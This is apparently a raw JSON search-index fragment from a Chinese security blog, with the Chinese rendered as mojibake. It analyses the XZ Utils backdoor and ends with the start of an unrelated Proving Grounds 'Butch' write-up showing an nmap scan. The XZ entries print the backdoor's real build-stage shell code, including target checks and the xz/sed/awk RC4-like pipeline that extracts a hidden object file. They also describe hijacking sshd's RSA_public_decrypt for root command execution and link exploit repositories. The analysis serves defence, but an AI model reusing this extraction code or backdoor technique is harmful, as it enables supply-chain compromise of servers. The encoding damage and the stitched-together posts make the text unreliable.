äº‹å®ä¸Šï¼Œåœ¨ç°æœ‰çš„5.6.0å’Œ5.6.1çš„TARå­˜æ¡£ä¸­éƒ½æ²¡å‘ç°ä»»ä½•å¸¦æœ‰ç­¾åçš„æ–‡ä»¶ï¼Œçœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªå¾…ä½¿ç”¨çš„â€œæ‰©å±•æ’ä»¶â€ç³»ç»Ÿï¼Œå…è®¸æœªæ¥æ·»åŠ è„šæœ¬ä»¥åœ¨è¯¥é˜¶æ®µçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œè€Œæ— éœ€ä¿®æ”¹åŸå§‹çš„è´Ÿè½½æ–‡ä»¶ã€‚æ¯•ç«Ÿï¼Œä¸æ–­åœ°ä¿®æ”¹ bad å’Œ good æµ‹è¯•æ–‡ä»¶å¾ˆå¯ç–‘ã€‚ ç›®æ ‡é€‰æ‹© æ­¤è„šæœ¬ä¼šæ£€æŸ¥å„ç§æ¡ä»¶ï¼Œä¾‹å¦‚è®¡ç®—æœºçš„ä½“ç³»ç»“æ„ã€‚ if ! (echo \"$build\" | grep -Eq \"^x86_64\" \u003e /dev/null 2\u003e\u00261) \u0026\u0026 (echo \"$build\" | grep -Eq \"linux-gnu$\" \u003e /dev/null 2\u003e\u00261);then å¦‚æœ amd64/x86_64 æ˜¯æ„å»ºçš„ç›®æ ‡ å¦‚æœç›®æ ‡ä½¿ç”¨åç§° linux-gnu ï¼ˆä¸»è¦æ˜¯æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº† glibcï¼‰ å®ƒè¿˜ä¼šæ£€æŸ¥æ­£åœ¨ä½¿ç”¨çš„å·¥å…·é“¾ï¼š if test \"x$GCC\" != 'xyes' \u003e /dev/null 2\u003e\u00261;then exit 0 fi if test \"x$CC\" != 'xgcc' \u003e /dev/null 2\u003e\u00261;then exit 0 fi LDv=$LD\" -v\" if ! $LDv 2\u003e\u00261 | grep -qs 'GNU ld' \u003e /dev/null 2\u003e\u00261;then exit 0 å¦‚æœæ­£åœ¨å°è¯•å¤ç°æ„å»º Debian æˆ– Red Hat è½¯ä»¶åŒ…ï¼š if test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\";then å› æ­¤ï¼Œè¿™ç§æ”»å‡»ä¼¼ä¹æ˜¯é’ˆå¯¹ä½¿ç”¨ Debian æˆ– Red Hat æ´¾ç”Ÿå‘è¡Œç‰ˆè¿è¡Œ glibc çš„ amd64 ç³»ç»Ÿã€‚ å…¶ä»–ç³»ç»Ÿç›®å‰å¯èƒ½å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œä½†æ²¡æœ‰æ˜ç¡®çš„è¯æ®ã€‚ åé—¨æå– æ­£å¦‚ Andres åœ¨åŸå§‹ç”µå­é‚®ä»¶ä¸­æŒ‡å‡ºçš„é‚£æ ·ï¼Œåœ¨æŸäº›æ—¶å€™ä¼šæå– .o æ–‡ä»¶å¹¶å°†å…¶ç¼–ç»‡åˆ°ç¼–è¯‘/é“¾æ¥è¿‡ç¨‹ä¸­ã€‚ç”±ä»¥ä¸‹ä»£ç è´Ÿè´£ N=0 W=88664 else N=88664 W=0 fi xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed \"s/\\(.\\)/\\1\\n/g\" | LC_ALL=C awk 'BEGIN{FS=\"\\n\";RS=\"\\n\";ORS=\"\";m=256;for(i=0;i\u003cm;i++){t[sprintf(\"x%c\",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l\u003c8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[\"x\" (NF\u003c1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf \"%c\",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N \u003e /dev/null 2\u003e\u00261) \u0026\u0026 head -c +$W) \u003e liblzma_la-crc64-fast.o || true ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚å½’ç»“ä¸ºæœ‰æŸå‹ç¼©(compressed-but-somewhat-mangled)çš„æœ‰æ•ˆè´Ÿè½½çš„å¤§å°ï¼Œåœ¨ 5.6.0 ä¸­æ˜¯ 88792ï¼Œåœ¨ 5.6.1 ä¸­æ˜¯ 88664ï¼ŒAWK è„šæœ¬ä¸­çš„ä¸€ä¸ªå€¼å‘ç”Ÿäº†å˜åŒ–ï¼Œæˆ‘ä»¬ç¨åä¼šä»‹ç»è¿™ä¸€ç‚¹ã€‚ å®é™…ä¸ŠæŸäº›æ­¥éª¤ä¸Stage 1ç›¸åŒï¼ˆå®ƒçš„äºŒè¿›åˆ¶ payload åœ¨â€œgoodâ€æ–‡ä»¶æ•°æ®ä¸­å…ˆå‰è¢«å¿½ç•¥çš„éƒ¨åˆ†ä¸­ï¼‰ã€‚ ä¸Stage 1 ä¸­çš„æ­¥éª¤ 2 ç›¸åŒï¼Œç”¨xzè§£å‹ tests/files/good-large_compressed.lzma æ–‡ä»¶ ä¸Stage 1 ä¸­çš„æ­¥éª¤ 3 ç›¸åŒï¼Œå³â€œå¾ˆå¤š head å‡½æ•°â€è°ƒç”¨ã€‚ è¿™æœ‰ä¸åŒäº†ã€‚é¦–å…ˆä¹‹å‰çš„è¾“å‡ºè¢« sed å‘½ä»¤ç ´åäº†ã€‚LC_ALL=C sed \"s/\\(.\\)/\\1\\n/g\" å…¶ä½œç”¨å®é™…ä¸Šæ˜¯åœ¨æ¯ä¸ªå­—èŠ‚åé¢æ”¾ç½®ä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆæ¢è¡Œç¬¦æœ¬èº«é™¤å¤–ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ€ç»ˆåœ¨è¾“å‡ºä¸­å¾—åˆ°çš„æ˜¯æ¯è¡Œå­—èŠ‚çš„æƒ…å†µï¼ˆè¿™é‡Œæœ‰å¾ˆå¤šæ··åˆâ€œæ–‡æœ¬â€å’Œâ€œäºŒè¿›åˆ¶â€æ–‡ä»¶ï¼‰ã€‚è¿™æ­£æ˜¯ä¸‹ä¸€æ­¥æ‰€éœ€è¦çš„ã€‚ ä¸‹ä¸€æ­¥æ˜¯ AWK è„šæœ¬ï¼Œå®ƒå¯¹è¾“å…¥æµè¿›è¡Œ RC4â€¦ish æè¿°ã€‚ BEGIN { # Initialization part. FS = \"\\n\"; # Some AWK settings. RS = \"\\n\"; ORS = \"\"; m = 256; for(i=0;i\u003cm;i++) { t[sprintf(\"x%key\", i)] = i; key[i] = ((i * 7) + 5) % m; # Creating the cipher key. } i=0; # Skipping 4096 first byte","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:3","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":".oäºŒè¿›åˆ¶åˆ†æ è¿™å—æˆ‘ä¸æ“…é•¿ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ã€‚ å…³äº.oäºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œæ–‡ä¸­å¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¾ˆå¤šå‡½æ•°åŠŸèƒ½éƒ½æœ‰ç›¸åº”çš„æ¨æµ‹ï¼Œå¯ä»¥è¿›è¡Œå‚è€ƒã€‚ é€†å‘åçš„é¡¹ç›®ï¼ŒåŸºäºxz 5.6.1ç‰ˆæœ¬ï¼Œå¯è§ï¼šhttps://github.com/smx-smx/xzreï¼Œè¯¥é¡¹ç›®æ˜¯åŸºäºxz 5.6.1ç‰ˆæœ¬ã€‚ å›½å†…ä¹Ÿæœ‰ç¯‡æ–‡ç« åˆ†æçš„å¾ˆå¥½ï¼šXZå¼€æºé¡¹ç›®æŠ•æ¯’äº‹ä»¶æ·±å…¥è§£æ è¯¥åé—¨é¦–å…ˆåœ¨ sshd å¯åŠ¨æ—¶æ›¿æ¢ crc32_resolve() å’Œ crc64_resolveï¼Œç„¶åè¯•å›¾ä»å†…å­˜ä¸­è§£æç¬¦å·è¡¨ï¼Œå¹¶æŸ¥æ‰¾ RSA_public_decrypt@....plt ç¬¦å·ï¼Œå¹¶å°†å…¶æŒ‡å‘çš„åœ°å€æ›¿æ¢ä¸ºåé—¨ä»£ç ã€‚ åœ¨ SSH ç™»å½•è®¤è¯æ—¶ï¼Œsshd ä¼šè°ƒç”¨è¯¥ç¬¦å·ï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ”»å‡»ä»£ç ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:4","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"åé—¨è®¾è®¡åˆ†æ æ­¤åé—¨ç¨‹åºåŒ…å«å¤šä¸ªç»„ä»¶ã€‚åœ¨é«˜å±‚æ¬¡ä¸Šï¼š ä¸Šæ¸¸å‘å¸ƒçš„å‘å¸ƒå‹ç¼©åŒ…ä¸ GitHub çš„ä»£ç ä¸åŒã€‚è¿™åœ¨ C é¡¹ç›®ä¸­å¾ˆå¸¸è§ï¼Œå› æ­¤ä¸‹æ¸¸ä½¿ç”¨è€…ä¸éœ€è¦è®°ä½å¦‚ä½•è¿è¡Œ autotools å’Œ autoconfã€‚å‘å¸ƒç‰ˆä¸­çš„å‹ç¼©åŒ…ç‰ˆæœ¬ build-to-host.m4 ä¸ GitHub ä¸Šçš„ä¸Šæ¸¸ç‰ˆæœ¬æœ‰å¾ˆå¤§ä¸åŒã€‚ git å­˜å‚¨åº“ä¸­çš„ tests/ æ–‡ä»¶å¤¹ä¸­ä¹Ÿæœ‰ç²¾å¿ƒè®¾è®¡çš„æµ‹è¯•æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶ä½äºä»¥ä¸‹æäº¤ä¸­ï¼š tests/files/bad-3-corrupt_lzma2.xz (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) tests/files/good-large_compressed.lzma (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1) ç”± build-to-host.m4 è°ƒç”¨çš„è„šæœ¬è§£å‹ç¼©æ­¤æ¶æ„æµ‹è¯•æ•°æ®ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ä¿®æ”¹ç”Ÿæˆè¿‡ç¨‹ã€‚ IFUNC æ˜¯ glibc ä¸­å…è®¸é—´æ¥å‡½æ•°è°ƒç”¨çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºæ‰§è¡Œ OpenSSH èº«ä»½éªŒè¯ä¾‹ç¨‹çš„è¿è¡Œæ—¶æŒ‚é’©/é‡å®šå‘ã€‚IFUNC æ˜¯ä¸€ç§é€šå¸¸ç”¨äºåˆæ³•äº‹ç‰©çš„å·¥å…·ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒè¢«ç”¨äºæ­¤æ”»å‡»è·¯å¾„ã€‚ é€šå¸¸ï¼Œä¸Šæ¸¸å‘å¸ƒçš„ tarball ä¸ GitHub ä¸­è‡ªåŠ¨ç”Ÿæˆçš„ tarball ä¸åŒã€‚åœ¨è¿™äº›ä¿®æ”¹åçš„ tarball ä¸­ï¼ŒåŒ…å«ä¸€ä¸ªæ¶æ„ç‰ˆæœ¬ build-to-host.m4 ï¼Œç”¨äºåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ‰§è¡Œè„šæœ¬ã€‚ æ•´èµ·äº‹ä»¶éšåŒ¿çš„å¾ˆå¥½ï¼Œä»ç”¨äºå­˜å‚¨payloadçš„äºŒè¿›åˆ¶æµ‹è¯•æ–‡ä»¶ï¼Œåˆ°æ–‡ä»¶å†…å®¹é›•åˆ»ã€æ›¿æ¢å¯†ç å’Œ AWK ä¸­å®ç°çš„ RC4 å˜ä½“ï¼Œæ‰€æœ‰è¿™äº›éƒ½åªéœ€ä½¿ç”¨æ ‡å‡†å‘½ä»¤è¡Œå·¥å…·å³å¯å®Œæˆã€‚ æ‰€æœ‰è¿™ä¸€åˆ‡éƒ½åœ¨ 3 ä¸ªæ‰§è¡Œé˜¶æ®µä¸­è¿›è¡Œï¼Œå¹¶é€šè¿‡â€œæ‰©å±•â€ç³»ç»Ÿå®ç°é¢å‘æœªæ¥çš„äº‹ç‰©ï¼Œè€Œä¸å¿…å†æ¬¡æ›´æ”¹äºŒè¿›åˆ¶æµ‹è¯•æ–‡ä»¶ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:5","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"payload åˆ†æ å¦‚æœä¸Šè¿°åé—¨æ¡ä»¶å¾—åˆ°æ»¡è¶³ï¼Œpayloadå°†è¿è¡Œå¹¶æ³¨å…¥åˆ°æºä»£ç æ ‘ä¸­ã€‚ä»¥ä¸‹æ˜¯æˆ‘æ‰€çŸ¥é“çš„ä¸»è¦å†…å®¹ï¼š å¦‚æœæ­£åœ¨è¿è¡Œçš„ç¨‹åºå…·æœ‰è¿›ç¨‹åç§° /usr/sbin/sshd ï¼Œåˆ™payloadå°†æ¿€æ´»ã€‚ å®ƒä¹Ÿå¯èƒ½åœ¨å…¶ä»–åœºæ™¯ä¸­æ¿€æ´»ï¼Œç”šè‡³å¯èƒ½ä¸ ssh æ— å…³ã€‚ æš‚ä¸æ¸…æ¥šæœ‰æ•ˆè½½è·çš„ç›®çš„æ˜¯åšä»€ä¹ˆï¼Œæ­£åœ¨è°ƒæŸ¥ã€‚ Vanilla ä¸Šæ¸¸ OpenSSH ä¸å—å½±å“ï¼Œé™¤éå…¶ä¾èµ–é¡¹é“¾æ¥ liblzma ä¹‹ä¸€ã€‚ Lennart Poettering æ›¾æåˆ°å®ƒå¯èƒ½é€šè¿‡ pam-\u003elibselinux-\u003eliblzma å‘ç”Ÿï¼Œä¹Ÿå¯èƒ½åœ¨å…¶ä»–æƒ…å†µä¸‹å‘ç”Ÿï¼Œä½†æ˜¯â€¦â€¦ libselinux æ²¡æœ‰é“¾æ¥åˆ° liblzmaã€‚äº‹å®è¯æ˜ï¼Œè¿™ç§æ··æ·†æ˜¯å› ä¸º Fedora ä¸­ä¸€ä¸ªæ—§çš„ä»…é™ä¸‹æ¸¸çš„è¡¥ä¸å’Œ RPM è§„èŒƒä¸­é™ˆæ—§çš„ä¾èµ–å…³ç³»ï¼Œè¿™ç§ä¾èµ–å…³ç³»åœ¨åˆ é™¤åå¾ˆé•¿ä¸€æ®µæ—¶é—´å†…ä»ç„¶å­˜åœ¨ã€‚ PAM æ¨¡å—åœ¨è¿›ç¨‹ AFAIK ä¸­åŠ è½½å¾—å¤ªæ™šï¼Œæ— æ³•æ­£å¸¸å·¥ä½œï¼ˆå¦ä¸€ä¸ªå¯èƒ½çš„ä¾‹å­æ˜¯ pam_fprintd ï¼‰ã€‚Solar Designer åœ¨ oss-security ä¸Šä¹Ÿæå‡ºäº†è¿™ä¸ªé—®é¢˜ã€‚ payloadè¢«é—´æ¥åŠ è½½åˆ° sshd ã€‚ sshd é€šå¸¸è¢« patch ä»¥æ”¯æŒ systemd-notifyï¼Œä»¥ä¾¿åœ¨ SSHD è¿è¡Œæ—¶å¯ä»¥å¯åŠ¨å…¶ä»–æœåŠ¡ã€‚ åŠ è½½liblzmaæ˜¯å› ä¸ºå®ƒè¢« libsystemd çš„å…¶ä»–éƒ¨åˆ†æ‰€ä¾èµ–ï¼Œè¿™ä¸æ˜¯systemdçš„é”™ã€‚å¤§å¤šæ•°å‘è¡Œç‰ˆä½¿ç”¨çš„è¡¥ä¸éƒ½å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼šopenssh/openssh-portable#375ã€‚ æ›´æ–°ï¼šOpenSSHå¼€å‘äººå‘˜æ­£åœ¨è€ƒè™‘æ·»åŠ systemd-notifyåè®®çš„éåº“é›†æˆï¼Œè¿™æ„å‘³ç€å‘è¡Œç‰ˆå°†ä¸å†æ”¯æŒ patch libsystemd ã€‚ å¦‚æœæ­¤payloadåŠ è½½åˆ° openssh çš„sshd ä¸­ï¼Œåˆ™è¯¥ RSA_public_decrypt å‡½æ•°å°†è¢«é‡å®šå‘åˆ°æ¶æ„å®ç°ä¸­ã€‚è¿™ç§æ¶æ„å®ç°å¯ç”¨äºç»•è¿‡èº«ä»½éªŒè¯ã€‚ Filippo Valsorda åˆ†äº«çš„åˆ†æè¡¨æ˜ï¼Œæ”»å‡»è€…å¿…é¡»æä¾›ä¸€ä¸ªç”±payloadéªŒè¯çš„å¯†é’¥ï¼Œç„¶åå°†æ”»å‡»è€…çš„è¾“å…¥ä¼ é€’ç»™ system() ï¼Œä»è€Œæä¾›è¿œç¨‹ä»£ç æ‰§è¡Œ ï¼ˆRCEï¼‰ã€‚ å…³äºæ›´å¤šPayloadåˆ†æï¼Œå¯ä»¥å…³æ³¨äº›å¤§ä½¬ä»¬çš„è¿›åº¦å’Œé¡¹ç›®æƒ…å†µï¼š Filippo Valsorda çš„åˆ†æçº¿ç¨‹ï¼šhttps://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b é€šè¿‡ @smx-smx ï¼ˆWIPï¼‰ è¿›è¡Œ XZ åé—¨åˆ†æï¼šhttps://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504 modify_ssh_rsa_pubkey.py by @keeganyan - è„šæœ¬æ¥è§¦å‘å—æ„ŸæŸ“ sshd çš„æœ‰æ•ˆè´Ÿè½½çš„æ›´å¤šéƒ¨åˆ† xz-æ¶æ„è½¯ä»¶https://github.com/karcherm/xz-malware xz-åé—¨https://github.com/hamarituc/xz-backdoor ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:6","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"xz bits Jia Tan çš„ 328c52da8a2bbb81307644efdb58db2c422d9ba7 æäº¤åœ¨ CMake æ£€æŸ¥ä¸­åŒ…å«ä¸€ä¸ª . landlock æ²™ç›’æ”¯æŒã€‚è¿™å¯¼è‡´æ£€æŸ¥å§‹ç»ˆå¤±è´¥ï¼Œå› æ­¤æ²¡æœ‰æ£€æµ‹åˆ°ç¼ºå°‘æ”¯æŒã€‚ check_c_source_compiles æœ‰äººæè®®å¯¹ CMake è¿›è¡Œå¼ºåŒ–ï¼ˆå‚è§å…¶ä»–é¡¹ç›®ï¼‰ã€‚ IFUNC ç”± Hans Jensen åœ¨ ee44863ae88e377a5df10db007ba9bfadde3d314 ä¸­ä¸º crc64 å¼•å…¥ã€‚ Hans Jensen åæ¥ç»§ç»­è¦æ±‚ Debian åœ¨ https://bugs.debian.org/1067708 ä¸­æ›´æ–° xz-utilsï¼Œä½†å¯¹äºçƒ­å¿ƒçš„ç”¨æˆ·æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä»¶å¾ˆå¸¸è§çš„äº‹æƒ…ï¼Œæ‰€ä»¥å®ƒä¸ä¸€å®šæ˜¯é‚ªæ¶çš„ã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:7","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"äººå‘˜åˆ†æ æˆ‘æš‚æ—¶ä¸åœ¨æœ¬æ–‡æ¡£ä¸­æ¨æµ‹è¿™ä¸ªé¡¹ç›®èƒŒåçš„äººã€‚æ‰§æ³•éƒ¨é—¨å°†èƒ½å¤Ÿè¯†åˆ«è´£ä»»äººã€‚ä»–ä»¬å¯èƒ½ä¹Ÿåœ¨ä¿®è¡¥ä»–ä»¬çš„ç³»ç»Ÿã€‚ xz-utils æœ‰ä¸¤ä¸ªç»´æŠ¤è€…ï¼š Lasse Collin ï¼ˆLarhzuï¼‰ ä»ä¸€å¼€å§‹å°±ç»´æŠ¤ xzï¼ˆ~2009 å¹´ï¼‰ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œ lzma-utils . Jia Tan ï¼ˆJiaT75ï¼‰ åœ¨è¿‡å» 2-2.5 å¹´å†…å¼€å§‹ä¸º xz åšè´¡çŒ®ï¼Œå¹¶åœ¨å¤§çº¦ 1.5 å¹´å‰è·å¾—äº†æäº¤è®¿é—®æƒé™ï¼Œç„¶åè·å¾—äº†å‘å¸ƒç®¡ç†å‘˜æƒé™ã€‚ä»–äº 2024 å¹´ 3 æœˆ 31 æ—¥è¢«æ’¤èŒï¼Œå› ä¸º Lasse å¼€å§‹äº†ä»–æœªæ¥çš„é•¿æœŸå·¥ä½œã€‚ åˆ†æäººå‘˜Lasse ç›®å‰åœ¨è¿™ä¸€åˆ‡å¼€å§‹ä¹‹å‰å°±å¼€å§‹äº†äººå‘˜åˆ†æã€‚ä»–åœ¨ https://tukaani.org/xz-backdoor/ ä¸Šå‘å¸ƒäº†æ›´æ–°ï¼Œå¹¶æ­£åœ¨ä¸ç¤¾åŒºåˆä½œè¿›è¡Œä¸€æ­¥åˆ†æå¤„ç†ã€‚è¯·è€å¿ƒç­‰å¾…ä»–ï¼Œå› ä¸ºä»–ä¼šåŠ å¿«é€Ÿåº¦å¹¶èŠ±æ—¶é—´ä»”ç»†åˆ†ææƒ…å†µã€‚ æœ¬æ¬¡äº‹ä»¶çš„ä¸»è§’æ˜¯Jia Tan ï¼ˆJiaT75ï¼‰ï¼Œæ ¹æ®ä»–çš„åå­—ï¼Œä»–å¸Œæœ›äººä»¬ç›¸ä¿¡ä»–æ˜¯äºšæ´²äººï¼Œç‰¹å¹¶ä¸”ä»–çš„ç»å¤§å¤šæ•°æäº¤éƒ½æ˜¯ UTC+08 æ—¶é—´æˆ³ã€‚ ç„¶è€Œï¼Œæˆ‘æ›´ç›¸ä¿¡ä»–å®é™…ä¸Šæ¥è‡ª UTC+02/UTC+03æ—¶åŒºçš„æŸä¸ªåœ°æ–¹ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸œæ¬§ï¼ˆEETï¼‰ã€ä»¥è‰²åˆ—ï¼ˆISTï¼‰ç­‰ã€‚ä»–é€šå¸¸æ—©ä¸Š 9 ç‚¹åˆ°ä¸‹åˆ 6 ç‚¹å·¥ä½œï¼ˆæ ¹æ® EET è°ƒæ•´ï¼‰ã€‚è¿™æ¯”åœ¨å‘¨äºŒæ™šä¸Šåˆå¤œå’Œå‡Œæ™¨ 1 ç‚¹å·¥ä½œçš„äººæ›´åˆç†ï¼ˆä½¿ç”¨ UTC+08ï¼‰ã€‚ å…³äºè¿™äº›ï¼Œè¯¦æƒ…å¯è§ï¼šhttps://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:4:8","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"æ¼æ´åˆ©ç”¨ githubå·²æœ‰å…¬å¼€çš„demo expï¼Œè¿™ä¸ªexpé€šè¿‡patchåé—¨ä¸­çš„å…¬é’¥ä¸ºè‡ªå·±çš„ç§é’¥æ¥éªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚ è§ https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg å·²æœ‰å¤ç° ä¸‹è½½äº†debianå®˜æ–¹ç¼–è¯‘çš„debåŒ…ã€‚å®‰è£…ä¹‹åä½¿ç”¨patch.pyè„šæœ¬æ‰‹åŠ¨patchã€‚ ç„¶åå¯åŠ¨sshdè¿›ç¨‹ï¼Œä½¿å…¶ç›‘å¬åœ¨2222ç«¯å£ã€‚ ä¹‹åè¿è¡Œexploitï¼Œæ‰§è¡Œçš„å‘½ä»¤ä¸ºid \u003e /tmp/.xzã€‚ è¿è¡Œä¹‹åå¯ä»¥çœ‹åˆ°å‘½ä»¤æˆåŠŸè¢«æ‰§è¡Œï¼Œå¹¶ä¸”å‘½ä»¤æ‰§è¡Œçš„æƒé™ä¸ºrootã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:5:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"åç»­å½±å“ æœ‰å¾ˆå¤šäººè®¨è®ºè¯´å¾ˆå¤§å¯èƒ½æ˜¯å›½å®¶çº§çš„ä¾›åº”é“¾æ”»å‡»ï¼Œ XZæ”»å‡»çš„å¤æ‚ç¨‹åº¦å’Œæ”»å‡»æ¨¡å‹æµç¨‹éƒ½éå¸¸å¤¸å¼  è¿™æ˜¯ä¸€èµ·å¶ç„¶å‘ç°çš„äº‹ä»¶ï¼Œé‚£ä¹ˆè¿˜æœ‰å¤šå°‘äº‹æƒ…æœªè¢«å‘ç°ã€‚å†°å±±ä¹‹ä¸‹è¿˜æœ‰å¤šå°‘ï¼Ÿ æ¨åŠ¨äº†å¼€æºç¤¾åŒºçš„åé—´è°ç±»å®‰å…¨æ„è¯†é—®é¢˜å‘ç°ï¼Œå¾ˆå¤šå¼€æºç¤¾åŒºè¿‘æœŸéƒ½åœ¨ç­›æŸ¥è¿™ç§åŒç±»é—®é¢˜ã€‚ å¼€æºäº§å“çš„ç»´æŠ¤ï¼Œå½“æ•´ä¸ªäº§å“åŸºäºä¸€ä¸ªè¿‡åº¦åŠ³ç´¯çš„äººèº«ä¸Šæ—¶ï¼Œåœ¨æ²¡æœ‰ä»»ä½•è´¢åŠ¡æˆ–è¿è¥ä¸Šçš„æ”¯æŒï¼Œå¾ˆå®¹æ˜“æ…¢æ…¢å‡ºç°å¿ƒç†å¥åº·å±æœºã€‚ ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:6:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["æ¼æ´åˆ†æ","èŒä¸šç”Ÿæ¶¯"],"content":"å‚è€ƒé“¾æ¥ Andres Freund é‚®ä»¶åŸæ–‡ï¼šhttps://www.openwall.com/lists/oss-security/2024/03/29/4 å¥‡å®‰ä¿¡Cert https://mp.weixin.qq.com/s/F2k1bPmCuqwUAZkNiIFA-w Everything I Know About the Xz Backdoor: https://boehs.org/node/everything-i-know-about-the-xz-backdoor xz åé—¨é•œåƒåœ°å€ https://github.com/thesamesam/xz-archive xz/liblzma: Bash-stage Obfuscation Explained : https://gynvael.coldwind.pl/?lang=en\u0026id=782#stage2-ext FAQ on the xz-utils backdoor (CVE-2024-3094) https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27 XZ Backdoor Analysisï¼šhttps://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504 xzreï¼šhttps://github.com/smx-smx/xzre XZ Backdoor: Times, damned times, and scamsï¼šhttps://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and XZå¼€æºé¡¹ç›®æŠ•æ¯’äº‹ä»¶æ·±å…¥è§£æï¼šhttps://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:7:0","tags":["æ¼æ´åˆ†æ"],"title":"XZ Utils Backdoor äº‹ä»¶åˆ†ææ±‡æ€»","uri":"/posts/xz-backdoor-analysis/"},{"categories":["é¶åœº"],"content":"Butch è¿™æ˜¯ç¬¬26å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦ä¸­ç­‰ï¼Œåç§° Butch If you know your ASP.NET, you will be fine. Otherwise, this machine will teach you some of that. 192.168.225.63 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.225.63 -T4 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-12 16:12 CST Nmap scan report for 192.168.225.63 Host is up (0.19s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 25/tcp open smtp Microsoft ESMTP 10.0.17763.1 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 